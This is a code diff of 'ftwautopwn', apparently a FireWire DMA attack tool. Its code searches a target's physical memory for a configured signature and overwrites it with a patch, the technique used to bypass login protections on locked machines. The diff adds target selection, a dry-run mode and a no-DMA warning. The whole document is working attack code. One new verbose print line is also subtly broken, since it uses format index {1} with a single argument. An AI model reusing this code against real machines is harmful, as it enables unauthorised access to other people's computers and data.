@@ -9,6 +9,7 @@ from ftwautopwn.util import print_msg, Context
 from time import sleep
 import sys
 import math
+import collections
 
 ctx = Context()
 
@@ -59,7 +60,6 @@ class MemoryFile:
     
     def readv(self, req):
         for r in req:
-            #print(str(r[0]) + ' ' + str(r[1]))
             self.file.seek(r[0])
             yield (r[0], self.file.read(r[1]))
     
@@ -74,13 +74,56 @@ def run(context):
     global ctx
     ctx = context
     config = ctx.config
-    encoding = ctx.encoding
+    enc = ctx.encoding
     
+    # Select target unless already supplied by user
+    if not ctx.target:
+        list_targets(config)
+        ctx.target = select_target(config, False)
+    
+    # Parse the command line arguments
+    sigs = unhexlify(bytes(config.get(ctx.target, 'signature'), enc))
+    patch = unhexlify(bytes(config.get(ctx.target, 'patch'), enc))
+    off = int(config.get(ctx.target, 'pageoffset'))
+    print_msg('+', 'You have selected: ' + ctx.target)
+    print('    Using signature: ' + hexlify(sigs).decode(enc))
+    print('    Using patch: ' + hexlify(patch).decode(enc))
+    print('    Using offset: ' + str(off))
+    
+    d = None
+    if ctx.file_mode:
+        d = MemoryFile(ctx.file_name, ctx.PAGESIZE)
+    else:
+        d = initialize_fw(d)
+    
+    try:
+        # Find
+        addr = findsig(d, sigs, off)
+        print()
+        print_msg('+', 'Signature found at 0x%x.' % addr)
+        # Patch and verify
+        if not ctx.dry_run: 
+            d.write(addr, patch)
+            if d.read(addr, len(patch)) == patch:
+                print_msg('+', 'Write-back verified; patching successful. Bon voyage!')
+            else:
+                print_msg('-', 'Write-back could not be verified; patching unsuccessful.')
+    except IOError:
+        print('-', 'Signature not found.')
+
+
+def list_targets(config):
     # Populate list with methods from config file
     methods = list()
+    
+    # Check that the config file contains targets
+    if not config.sections():
+        print_msg('!', 'No configurated targets in config file.')
+        sys.exit(1)
+    
     i = 1
     for method_name in config.sections():
-        # Generate lists of corresponding sigs, patches and offs
+        # Generate lists of corresponding sigs, patches and offsets
         sigs = config.get(method_name, 'signature').split(':')
         patches = config.get(method_name, 'patch').split(':')
         pageoffsets = config.get(method_name, 'pageoffset').split(':')
@@ -102,37 +145,6 @@ def run(context):
         
         i += 1
     
-    list_targets(config)
-    selected_target = select_target(config)
-    
-    # Parse the command line arguments
-    sigs = unhexlify(bytes(config.get(selected_target, 'signature'), encoding))
-    patch = unhexlify(bytes(config.get(selected_target, 'patch'), encoding))
-    off = int(config.get(selected_target, 'pageoffset'))
-    print_msg('+', 'You have selected: ' + selected_target)
-    print_msg('|', 'Using signature: ' + hexlify(sigs).decode(encoding))
-    print_msg('|', 'Using patch: ' + hexlify(patch).decode(encoding))
-    print_msg('|', 'Using offset: ' + str(off))
-    
-    d = None
-    if ctx.file_mode:
-        d = MemoryFile(ctx.file_name, ctx.PAGESIZE)
-    else:
-        d = initialize_fw(d)
-    
-    try:
-        # Find
-        addr = findsig(d, sigs, off)
-        print()
-        print_msg('+', 'Signature found at 0x%x.' % addr)
-        # Patch and verify
-        d.write(addr, patch)
-        assert d.read(addr, len(patch)) == patch
-    except IOError:
-        print('-', 'Signature not found.')
-
-
-def list_targets(config):
     print_msg('+', 'Available targets:')
     i = 1
     for target in config.sections():
@@ -141,8 +153,8 @@ def list_targets(config):
         i += 1
 
 
-def select_target(config):
-    selected = input('Please select target: ')
+def select_target(config, selected):
+    if not selected: selected = input('Please select target: ')
     nof_targets = len(config.sections())
     try:
         selected = int(selected)
@@ -177,14 +189,38 @@ def initialize_fw(d):
 def findsig(d, sig, off):
     # Skip the first 1 MiB of memory
     addr = 1 * 1024 * 1024 + off
+    # An array to store the last read values of data so that we can assess if
+    # we're sucking data through the wire or not
+    buf = collections.deque(10*[0], 10)
     while True:
         # Prepare a batch of 128 requests
         r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
         for caddr, cand  in d.readv(r):
             if cand == sig: return caddr
         mibaddr = math.floor(addr / (1024 * 1024))
-        sys.stdout.write('[+] Searching for signature, {0:>4d} MiB so far. ' \
-                         'Data read: {1}'.format(mibaddr, hexlify(cand).decode(ctx.encoding)))
+        sys.stdout.write('[+] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
+        if ctx.verbose:
+            sys.stdout.write(' Data read: {1}'.format(hexlify(cand).decode(ctx.encoding)))
+        
         sys.stdout.write('\r')
         sys.stdout.flush()
-        addr += ctx.PAGESIZE * 128  
+        
+        buf.appendleft(cand)
+        if checkEqual(buf):
+            print()
+            cont = input('[-] Looks like we\'re not getting any data. We ' \
+                         'could be outside memory\n    boundaries, or simply ' \
+                         'not have DMA. Try using -v/--verbose to debug.\n    '\
+                         'Continue? [Y/n]')
+            if cont == 'n': sys.exit(1)
+            else: buf = collections.deque(buf.maxlen*2*[0], buf.maxlen*2)
+        
+        addr += ctx.PAGESIZE * 128
+
+def checkEqual(iterator):
+    try:
+        iterator = iter(iterator)
+        first = next(iterator)
+        return all(first == rest for rest in iterator)
+    except StopIteration:
+        return True
